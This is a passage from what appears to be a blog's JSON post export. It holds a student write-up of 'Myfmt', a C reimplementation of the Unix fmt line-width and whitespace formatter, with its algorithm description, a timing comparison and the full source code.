”\\t”, some of them will be removed. The result is that between every two words there will be only one blank. After every sentence, which means there are some characters like ‘.’, ‘?’, ‘!’ shown up at the end of a sentence, there will be two blanks. After this action, the length of every line will be limited within 75 characters by default. If users input the maximum length of every line, this limitation will be the input number.\n##INPUT AND OUTPUT##\nThe input text must come from an input file. The result will be output as a “stdout” stream. The\ninput format are exampled here:\n>./fmt –u –w 50 inputfile1 inputfile2 > outputfile\n\n##ALGORITHM DESIGN##\n###Overall###\nThis program formats texts line by line. In this way, it can handle a very large file in a very small memory cost. It opens the first file, reads a single line into an array, formats it and output it into a particular file and then the next line. After handling a file, it will handle another in the same way.\n###Uniform function###\nIn this function, there are two strings. The first one is the original string. The second string is the new string. There will be two pointers. The first pointer points at the original string, the second one points at the new string. The first pointer, which points at the original string, always keep moving forward.\n1) When the first pointer points at a normal character, this character will be copied to the new string, and the pointer points at the new string will move forward too.\n2) When the first pointers points at a blank such as ‘ ’, ‘\\t’, this pointer will keep moving until it points at a normal character which is not a blank character. At the same time, the second pointer will add a blank to the second string. If the last no-blank character is ‘.’, ‘?’ or ‘!’, the second pointer will add two blanks to the second string.\nAfter this, the result string will be sent to the –w procession. After the –w procession, we get the final result of this line.\n###Width function###\nIn this function, there also are two strings and two pointers like the uniform function. In order to have a better performance, I designed an algorithm for this function.\n1) Reset the length limitation to the original limitation minus the number of leading blanks. In this way, we can easily get the real length of characters.\n2) The original string pointer jumps from the start position of the new line to the expected end position, which is the start position add the length limitation.\n3)If this position is in the middle of a word, then the first pointer will move backward until the pointer finds a blank character or reaches the new start position.\n4)If the pointer gets a blank, it will continue move backward to finds a normal character.\n5) If the pointer reaches the new start position, it will move forward to find the end of this word.\n6) Using “memcpy” to copy this new line which from the new start position to the end position to the aim string.\n7) Set the new start to the position of the end position and repeat the steps from 2 to 7.\n###Efficiency###\nI compared the run time of my program and the system fmt program. The data to test this two programs is a novel called “Jane Eyre”, which contains 21062 lines. Here is the result. (The time is the average time of 10 tests, using linux time function). I’m sure that the system’s fmt is much better than mine. There are lots of things that I didn’t considered like the proper real length, the dictionary and so on.\n\n![](/image/20151005.jpg)\n\nHere is the code:\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <getopt.h>\n#include <string.h>\n#define FILE_LEN 10000\nstatic struct option long_options[] = {\n    {\"help\", no_argument, NULL, 'h'},\n    {\"version\", no_argument, NULL, 'v'},\n    {\"uniform\", no_argument, NULL, 'u'},\n    {\"width\", required_argument,NULL, 'w'},\n    {NULL, no_argument, NULL ,0}\n};\nstruct Task{\n    int w,u,h,v;\n    int w_len;\n}tasks;\nint i;\nint startblank = 0;\nint isBlank(char c){\n    return c == ' ' || c == '\\t' || c == '\\n';\n}\nint isFinish(char c){\n    return c == '.' || c == '?' || c == '!' ;\n}\nvoid showhelp(){// help info\n    printf(\"\\nUsage: fmt [-WIDTH] [OPTION]... [FILE]...\\n\");\n    printf(\"Format each line in the FILE(s)\\n\\n\");\n    printf(\"  -w, --width\\t\\tmaximum line width (default of 75)\\n\");\n    printf(\"  -u, --uniform\\t\\tone space between words, two after sentences\\n\\n\");\n    printf(\"      --help\\t\\toutput this help and exit\\n\");\n    printf(\"      --version\\t\\toutput the version and exit\\n\\n\");\n    printf(\"Report myfmt bugs to sol315@lehigh.edu\\n\");\n    return ;\n}\nvoid error(int id,int msg, char *file){//errors\n    printf(\"Error from fmt: \");\n    switch (id){\n        case 1:\n            printf(\"Input file not found\\n\");\n            break;\n        case 2:\n            printf(\"Input file reading error in file \\\"%s\\\" line %d.\\n\",file,msg);\n            break;\n        case 3:\n            printf(\"The -w function requires the length of the line bigger than 0\\n\");\n            break;\n        case 4:\n            printf(\"Fmt requires input arguments\\n\");\n            showhelp();\n            break;\n\n    }\n    return ;\n}\n\n/**\n * this function is used to do the -w work\n * @param \n *          char *ret: the address of the string that needed to be changed\n *          int len: the length of that string\n * @return  the address of the changed string\n **/\nchar *runw(char *ret,int len){\n    char buffer[FILE_LEN] = {0};    \n    int ret_len = 0;//current length of the new string\n    int jump = tasks.w_len;\n    if(strlen(ret) == 1) return ret;\n    strcpy(buffer,ret);//when this function finished, the \"buffer\" space will gone. So we use buffer to\n                       //store the original string, use \"ret\" to store the new string\n    memset(ret,0,FILE_LEN);\n    if(jump <= startblank) jump = startblank + 1;//if the max width smaller than startblank, this line\n                                                 //should place one word. We set jump=startblack+1 to do that\n    int posi = jump - 1,pre = startblank;//pre means the start position of the new line in the original string. posi means the current pointer position in original string\n    while(posi < len){//this means the process hasn't finished\n        while(posi > pre && !isBlank(buffer[posi])) --posi;//if the max width cuts a word, get the start of the word.\n        if(posi == pre) while(!isBlank(buffer[posi])) ++posi;//if the first single word longer than the max width, get the end of the word.\n        while(isBlank(buffer[-- posi]));//if the position of the pointer is in blank, move backward and get the end of this line.\n        posi ++;\n\t\tmemset(ret + ret_len, ' ', startblank);//put some blanks in the start of the new line\n\t\tret_len += startblank;//get the new length of the new string\n\t\tmemcpy(ret + ret_len, buffer + pre, posi - pre);//copy the line from the original string to the new one\n\t\tret_len += posi - pre;\n\t\tret[ret_len ++] = '\\n';\n        while(isBlank(buffer[posi])) ++posi;//skip the blanks and get the start of next line\n        pre = posi;\n        posi += jump - startblank - 1;//jump to the next possible cut point\n    }\n\tif(pre != len) {//this part is used to handle the last line of the string\n\t\tposi = len - 1;//the position of the pointer is the end of the string\n\t\twhile(isBlank(buffer[posi])) --posi;//get the last no-blank char\n\t\tposi ++;\n\t\tif(posi != pre) {\n\t\t\tmemset(ret + ret_len, ' ', startblank);\n\t\t\tret_len += startblank;\n\t\t\tmemcpy(ret + ret_len, buffer + pre, posi - pre);\n\t\t\tret_len += posi - pre;\n\t\t}\n        ret[ret_len ++] = '\\n';\n\t}\n\t\n    return ret;\n}\n/**\n * this function is used to do the -u task\n * @param   buffer: the address of file \n *          len: the length of this file\n * @return  the address of the result string\n **/\nchar *runu(char* ret,int len){\n    char buffer[FILE_LEN];\n    int ret_len = 0;\n    int flag = 0;\n    strcpy(buffer,ret);\n    memset(ret, 0, FILE_LEN);//end of the string\n\tmemset(ret,' ',startblank);//put some blanks to the start of the new string\n\tret_len = startblank;\n    for(i = 0;i < len;){\n        if(isFinish(buffer[i])) flag = 1;//if this char means the end of a sentence, set flag true\n        if(!isBlank(buffer[i])) ret[ret_len ++] = buffer[i ++];//if it is a normal char, copy it \n        else{//if it is a blank char\n            if(i) ret[ret_len ++] = ' ';//if it isn't the start of the string, put a ' ' in it.\n            if(flag){\n                ret[ret_len ++] = ' ';//if it is the end of a sentence, put another blank in it.\n                flag = 0;\n            }\n            while(isBlank(buffer[++ i]));//skip every blanks. using ++ i instead of i ++ can loop 1 time less\n        }\n    }\n    return runw(ret,ret_len);//every -u needs a -w\n}\nint getStartBlank(char *buffer,int len){//get the number of start blank\n    for(i = 0;i < len;++ i)\n        if(!isBlank(buffer[i])) \n            return i;\n    return 0;\n}\nint fmt(char *filename){\n    FILE *fp;\n    char buffer[FILE_LEN] = {0};\n    char *res;\n    int linenum = 0;\n    res = buffer;\n    int len;\n    fp = fopen(filename,\"r\");\n    if(NULL == fp){\n        error(1,0,NULL);\n        return -1;\n    }\n    while(fgets(buffer,FILE_LEN - 2,fp) != NULL){//format the file line by line\n        len = strlen(buffer);\n        linenum ++;\n        if(ferror(fp)) {\n            error(2,linenum,filename);\n            return -1;\n        }\n        startblank = getStartBlank(buffer,len);\n        if(tasks.u) res = runu(res,len);//if we do -u, the -w has been done so \"if else if\"\n\t    else if(tasks.w) res = runw(res,len);\n        printf(\"%s\",res);\n    }   \n    fclose(fp);\n    return 0;\n}\nvoid showversion(){\n    printf(\"version 25\\n\");\n    return ;\n}\nvoid init(){\n    tasks.w = tasks.u = 0;\n    tasks.h = tasks.v = 0;\n    tasks.w_len = 75;\n    return ;\n}\nint main(int argc,char **argv){\n    init();\n    int option_index = 0;\n    int opt = 0;\n    char optstring[4] = \"uw:\";\n    char** infile;\n    int file_num = 0;\n    while((opt = getopt_long(argc,argv,optstring,long_options,&option_index)) != -1){\n        switch (opt){\n            case 'u': \n                tasks.u = 1;\n                break;\n            case 'w':\n                if(optarg != NULL) tasks.w_len = atoi(optarg);\n                if(tasks.w_len <= 0){\n                    error(3,0,NULL);\n                    return -1;\n                }\n                tasks.w = 1;\n                break;\n            case 'h':\n                tasks.h = 1;\n                break;\n            case 'v':\n                tasks.v = 1;\n                break;\n        }\n    }\n    if(argc == 1) error(4,0,NULL);\n    infile = argv + optind;//get the name of input files\n    file_num = argc - optind;//get the number of input files\n    for(i = 0;i < file_num;++ i){\n        fmt(infile[i]);\n    }\n    if(tasks.h) showhelp();\n    if(tasks.v) showversion();\n    return 0;\n}\n```\n","source":"_posts/Myfmt.md","raw":"title: \"Myfmt\"\ndate: 2015-10-05 22:48:09\ntags: ADV Programming\n---\nAuthor: Song Li\n##AIM##\nThis program is use to do text format things. Users can use this program to limit the width of every line into a particular length and can uniform every blanks.\n<!--more-->\n##USAGE##\nShown as \"--help\", there are two major functions:\n-u to format the text\n-w [length] to limit the width of a line into a\n--h to show the help page\n--v to show the version info\n##COMPILE##\nUsing\n\n> gcc -o fmt.out fmt.c\n\n##FILE STRUCTURE##\n\n>fmt.c: the main code of this program\n>inputjane: the inputfile that I use to test the efficiency\n>HW2 fmt readme.pdf: Document of this program\n\n##RESULT##\n-w [length]: if the original line is longer than the number length, this line will be cut into several lines. After this operation, the maximum length of every line will be the input number “length” and\nevery new line which comes from a same original line will share the same indent just as the original line. They have the same number of leading blanks. And the words will not be separated which means if a word is right at the cut point of the original line, this word will be moved to the next line. So no word will be cut. The default length of every new line is 75.\n-u: if there are more than one blank characters such as ‘ ’, ”\\t”, some of them will be removed. The result is that between every two words there will be only one blank. After every sentence, which means there are some characters like ‘.’, ‘?’, ‘!’ shown up at the end of a sentence, there will be two blanks. After this action, the length of every line will be limited within 75 characters by default. If users input the maximum length of every line, this limitation will be the input number.\n##INPUT AND OUTPUT##\nThe input text must come from an input file. The result will be output as a “stdout” stream. The\ninput format are exampled here:\n>./fmt –u –w 50 inputfile1 inputfile2 > outputfile\n\n##ALGORITHM DESIGN##\n###Overall###\nThis program formats texts line by line. In this way, it can handle a very large file in a very small memory cost. It opens the first file, reads a single line into an array, formats it and output it into a particular file and then the next line. After handling a file, it will handle another in the same way.\n###Uniform function###\nIn this function, there are two strings. The first one is the original string. The second string is the new string. There will be two pointers. The first pointer points at the original string, the second one points at the new string. The first pointer, which points at the original string, always keep moving forward.\n1) When the first pointer points at a normal character, this character will be copied to the new string, and the pointer points at the new string will move forward too.\n2) When the first pointers points at a blank such as ‘ ’, ‘\\t’, this pointer will keep moving until it points at a normal character which is not a blank character. At the same time, the second pointer will add a blank to the second string. If the last no-blank character is ‘.’, ‘?’ or ‘!’, the second pointer will add two blanks to the second string.\nAfter this, the result string will be sent to the –w procession. After the –w procession, we get the final result of this line.\n###Width function###\nIn this function, there also are two strings and two pointers like the uniform function. In order to have a better performance, I designed an algorithm for this function.\n1) Reset the length limitation to the original limitation minus the number of leading blanks. In this way, we can easily get the real length of characters.\n2) The original string pointer jumps from the start position of the new line to the expected end position, which is the start position add the length limitation.\n3)If this position is in the middle of a word, then the first pointer will move backward until the pointer finds a blank character or reaches the new start position.\n4)If the pointer gets a blank, it will continue move backward to finds a normal character.\n5) If the pointer reaches the new start position, it will move forward to find the end of this word.\n6) Using “memcpy” to copy this new line which from the new start position to the end position to the aim string.\n7) Set the new start to the position of the end position and repeat the steps from 2 to 7.\n###Efficiency###\nI compared the run time of my program and the system fmt program. The data to test this two programs is a novel called “Jane Eyre”, which contains 21062 lines. Here is the result. (The time is the average time of 10 tests, using linux time function). I’m sure that the system’s fmt is much better than mine. There are lots of things that I didn’t considered like the proper real length, the dictionary and so on.\n\n![](/image/20151005.jpg)\n\nHere is the code:\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <getopt.h>\n#include <string.h>\n#define FILE_LEN 10000\nstatic struct option long_options[] = {\n    {\"help\", no_argument, NULL, 'h'},\n    {\"version\", no_argument, NULL, 'v'},\n    {\"uniform\", no_argument, NULL, 'u'},\n    {\"width\", required_argument,NULL, 'w'},\n    {NULL, no_argument, NULL ,0}\n};\nstruct Task{\n    int w,u,h,v;\n    int w_len;\n}tasks;\nint i;\nint startblank = 0;\nint isBlank(char c){\n    return c == ' ' || c == '\\t' || c == '\\n';\n}\nint isFinish(char c){\n    return c == '.' || c == '?' || c == '!' ;\n}\nvoid showhelp(){// help info\n    printf(\"\\nUsage: fmt [-WIDTH] [OPTION]... [FILE]...\\n\");\n    printf(\"Format each line in the FILE(s)\\n\\n\");\n    printf(\"  -w, --width\\t\\tmaximum line width (default of 75)\\n\");\n    printf(\"  -u, --uniform\\t\\tone space between words, two after sentences\\n\\n\");\n    printf(\"      --help\\t\\toutput this help and exit\\n\");\n    printf(\"      --version\\t\\toutput the version and exit\\n\\n\");\n    printf(\"Report myfmt bugs to sol315@lehigh.edu\\n\");\n    return ;\n}\nvoid error(int id,int msg, char *file){//errors\n    printf(\"Error from fmt: \");\n    switch (id){\n        case 1:\n            printf(\"Input file not found\\n\");\n            break;\n        case 2:\n            printf(\"Input file reading error in file \\\"%s\\\" line %d.\\n\",file,msg);\n            break;\n        case 3:\n            printf(\"The -w function requires the length of the line bigger than 0\\n\");\n            break;\n        case 4:\n            printf(\"Fmt requires input arguments\\n\");\n            showhelp();\n            break;\n\n    }\n    return ;\n}\n\n/**\n * this function is used to do the -w work\n * @param \n *          char *ret: the address of the string that needed to be changed\n *          int len: the length of that string\n * @return  the address of the changed string\n **/\nchar *runw(char *ret,int len){\n    char buffer[FILE_LEN] = {0};    \n    int ret_len = 0;//current length of the new string\n    int jump = tasks.w_len;\n    if(strlen(ret) == 1) return ret;\n    strcpy(buffer,ret);//when this function finished, the \"buffer\" space will gone. So we use buffer to\n                       //store the original string, use \"ret\" to store the new string\n    memset(ret,0,FILE_LEN);\n    if(jump <= startblank) jump = startblank + 1;//if the max width smaller than startblank, this line\n                                                 //should place one word. We set jump=startblack+1 to do that\n    int posi = jump - 1,pre = startblank;//pre means the start position of the new line in the original string. posi means the current pointer position in original string\n    while(posi < len){//this means the process hasn't finished\n        while(posi > pre && !isBlank(buffer[posi])) --posi;//if the max width cuts a word, get the start of the word.\n        if(posi == pre) while(!isBlank(buffer[posi])) ++posi;//if the first single word longer than the max width, get the end of the word.\n        while(isBlank(buffer[-- posi]));//if the position of the pointer is in blank, move backward and get the end of this line.\n        posi ++;\n\t\tmemset(ret + ret_len, ' ', startblank);//put some blanks in the start of the new line\n\t\tret_len += startblank;//get the new length of the new string\n\t\tmemcpy(ret + ret_len, buffer + pre, posi - pre);//copy the line from the original string to the new one\n\t\tret_len += posi - pre;\n\t\tret[ret_len ++] = '\\n';\n        while(isBlank(buffer[posi])) ++posi;//skip the blanks and get the start of next line\n        pre = posi;\n        posi += jump - startblank - 1;//jump to the next possible cut point\n    }\n\tif(pre != len) {//this part is used to handle the last line of the string\n\t\tposi = len - 1;//the position of the pointer is the end of the string\n\t\twhile(isBlank(buffer[posi])) --posi;//get the last no-blank char\n\t\tposi ++;\n\t\tif(posi != pre) {\n\t\t\tmemset(ret + ret_len, ' ', startblank);\n\t\t\tret_len += startblank;\n\t\t\tmemcpy(ret + ret_len, buffer + pre, posi - pre);\n\t\t\tret_len += posi - pre;\n\t\t}\n        ret[ret_len ++] = '\\n';\n\t}\n\t\n    return ret;\n}\n/**\n * this function is used to do the -u task\n * @param   buffer: the address of file \n *          len: the length of this file\n * @return  the address of the result string\n **/\nchar *runu(char* ret,int len){\n    char buffer[FILE_LEN];\n    int ret_len = 0;\n    int flag = 0;\n    strcpy(buffer,ret);\n    memset(ret, 0, FILE_LEN);//end of the string\n\tmemset(ret,' ',startblank);//put some blanks to the start of the new string\n\tret_len = startblank;\n    for(i = 0;i < len;){\n        if(isFinish(buffer[i])) flag = 1;//if this char means the end of a sentence, set flag true\n        if(!isBlank(buffer[i])) ret[ret_len ++] = buffer[i ++];//if it is a normal char, copy it \n        else{//if it is a blank char\n            if(i) ret[ret_len ++] = ' ';//if it isn't the start of the string, put a ' ' in it.\n            if(flag){\n                ret[ret_len ++] = ' ';//if it is the end of a sentence, put another blank in it.\n                flag = 0;\n            }\n            while(isBlank(buffer[++ i]));//skip every blanks. using ++ i instead of i ++ can loop 1 time less\n        }\n    }\n    return runw(ret,ret_len);//every -u needs a -w\n}\nint getStartBlank(char *buffer,int len){//get the number of start blank\n    for(i = 0;i < len;++ i)\n        if(!isBlank(buffer[i])) \n            return i;\n    return 0;\n}\nint fmt(char *filename){\n    FILE *fp;\n    char buffer[FILE_LEN] = {0};\n    char *res;\n    int linenum = 0;\n    res = buffer;\n    int len;\n    fp = fopen(filename,\"r\");\n    if(NULL == fp){\n        error(1,0,NULL);\n        return -1;\n    }\n    while(fgets(buffer,FILE_LEN - 2,fp) != NULL){//format the file line by line\n        len = strlen(buffer);\n        linenum ++;\n        if(ferror(fp)) {\n            error(2,linenum,filename);\n            return -1;\n        }\n        startblank = getStartBlank(buffer,len);\n        if(tasks.u) res = runu(res,len);//if we do -u, the -w has been done so \"if else if\"\n\t    else if(tasks.w) res = runw(res,len);\n        printf(\"%s\",res);\n    }   \n    fclose(fp);\n    return 0;\n}\nvoid showversion(){\n    printf(\"version 25\\n\");\n    return ;\n}\nvoid init(){\n    tasks.w = tasks.u = 0;\n    tasks.h = tasks.v = 0;\n    tasks.w_len = 75;\n    return ;\n}\nint main(int argc,char **argv){\n    init();\n    int option_index = 0;\n    int opt = 0;\n    char optstring[4] = \"uw:\";\n    char** infile;\n    int file_num = 0;\n    while((opt = getopt_long(argc,argv,optstring,long_options,&option_index)) != -1){\n        switch (opt){\n            case 'u': \n                tasks.u = 1;\n                break;\n            case 'w':\n                if(optarg != NULL) tasks.w_len = atoi(optarg);\n                if(tasks.w_len <= 0){\n                    error(3,0,NULL);\n                    return -1;\n                }\n                tasks.w = 1;\n                break;\n            case 'h':\n                tasks.h = 1;\n                break;\n            case 'v':\n                tasks.v = 1;\n                break;\n        }\n    }\n    if(argc == 1) error(4,0,NULL);\n    infile = argv + optind;//get the name of input files\n    file_num = argc - optind;//get the number of input files\n    for(i = 0;i < file_num;++ i){\n        fmt(infile[i]);\n    }\n    if(tasks.h) showhelp();\n    if(tasks.v) showversion();\n    return 0;\n}\n```\n","slug":"Myfmt","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681us0012wypd6norjttt","content":"<p>Author: Song Li</p>\n<p>##AIM##<br>This program is use to do text format things. Users can use this program to limit the width of every line into a particular length and can uniform every blanks.<br><a id=\"more\"></a></p>\n<p>##USAGE##<br>Shown as “–help”, there are two major functions:<br>-u to format the text<br>-w [length] to limit the width of a line into a<br>–h to show the help page<br>–v to show the version info</p>\n<p>##COMPILE##<br>Using</p>\n<blockquote>\n<p>gcc -o fmt.out fmt.c</p>\n</blockquote>\n<p>##FILE STRUCTURE##</p>\n<blockquote>\n<p>fmt.c: the main code of this program<br>inputjane: the inputfile that I use to test the efficiency<br>HW2 fmt readme.pdf: Document of this program</p>\n</blockquote>\n<p>##RESULT##<br>-w [length]: if the original line is longer than the number length, this line will be cut into several lines. After this operation, the maximum length of every line will be the input number “length” and<br>every new line which comes from a same original line will share the same indent just as the original line. They have the same number of leading blanks. And the words will not be separated which means if a word is right at the cut point of the original line, this word will be moved to the next line. So no word will be cut. The default length of every new line is 75.<br>-u: if there are more than one blank characters such as ‘ ’, ”\\t”, some of them will be removed. The result is that between every two words there will be only one blank. After every sentence, which means there are some characters like ‘.’, ‘?’, ‘!’ shown up at the end of a sentence, there will be two blanks. After this action, the length of every line will be limited within 75 characters by default. If users input the maximum length of every line, this limitation will be the input number.</p>\n<p>##INPUT AND OUTPUT##<br>The input text must come from an input file. The result will be output as a “stdout” stream. The<br>input format are exampled here:</p>\n<blockquote>\n<p>./fmt –u –w 50 inputfile1 inputfile2 &gt; outputfile</p>\n</blockquote>\n<p>##ALGORITHM DESIGN##</p>\n<p>###Overall###<br>This program formats texts line by line. In this way, it can handle a very large file in a very small memory cost. It opens the first file, reads a single line into an array, formats it and output it into a particular file and then the next line. After handling a file, it will handle another in the same way.</p>\n<p>###Uniform function###<br>In this function, there are two strings. The first one is the original string. The second string is the new string. There will be two pointers. The first pointer points at the original string, the second one points at the new string. The first pointer, which points at the original string, always keep moving forward.<br>1) When the first pointer points at a normal character, this character will be copied to the new string, and the pointer points at the new string will move forward too.<br>2) When the first pointers points at a blank such as ‘ ’, ‘\\t’, this pointer will keep moving until it points at a normal character which is not a blank character. At the same time, the second pointer will add a blank to the second string. If the last no-blank character is ‘.’, ‘?’ or ‘!’, the second pointer will add two blanks to the second string.<br>After this, the result string will be sent to the –w procession. After the –w procession, we get the final result of this line.</p>\n<p>###Width function###<br>In this function, there also are two strings and two pointers like the uniform function. In order to have a better performance, I designed an algorithm for this function.<br>1) Reset the length limitation to the original limitation minus the number of leading blanks. In this way, we can easily get the real length of characters.<br>2) The original string pointer jumps from the start position of the new line to the expected end position, which is the start position add the length limitation.<br>3)If this position is in the middle of a word, then the first pointer will move backward until the pointer finds a blank character or reaches the new start position.<br>4)If the pointer gets a blank, it will continue move backward to finds a normal character.<br>5) If the pointer reaches the new start position, it will move forward to find the end of this word.<br>6) Using “memcpy” to copy this new line which from the new start position to the end position to the aim string.<br>7) Set the new start to the position of the end position and repeat the steps from 2 to 7.</p>\n<p>###Efficiency###<br>I compared the run time of my program and the system fmt program. The data to test this two programs is a novel called “Jane Eyre”, which contains 21062 lines. Here is the result. (The time is the average time of 10 tests, using linux time function). I’m sure that the system’s fmt is much better than mine. There are lots of things that I didn’t considered like the proper real length, the dictionary and so on.</p>\n<p><img src=\"/image/20151005.jpg\" alt=\"\"></p>\n<p>Here is the code:</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;getopt.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> FILE_LEN 10000</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">struct</span> option long_options[] = &#123;</span><br><span class=\"line\">    &#123;<span class=\"string\">\"help\"</span>, no_argument, <span class=\"literal\">NULL</span>, <span class=\"string\">'h'</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">\"version\"</span>, no_argument, <span class=\"literal\">NULL</span>, <span class=\"string\">'v'</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">\"uniform\"</span>, no_argument, <span class=\"literal\">NULL</span>, <span class=\"string\">'u'</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">\"width\"</span>, required_argument,<span class=\"literal\">NULL</span>, <span class=\"string\">'w'</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"literal\">NULL</span>, no_argument, <span class=\"literal\">NULL</span> ,<span class=\"number\">0</span>&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> Task&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> w,u,h,v;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> w_len;</span><br><span class=\"line\">&#125;tasks;</span><br><span class=\"line\"><span class=\"keyword\">int</span> i;</span><br><span class=\"line\"><span 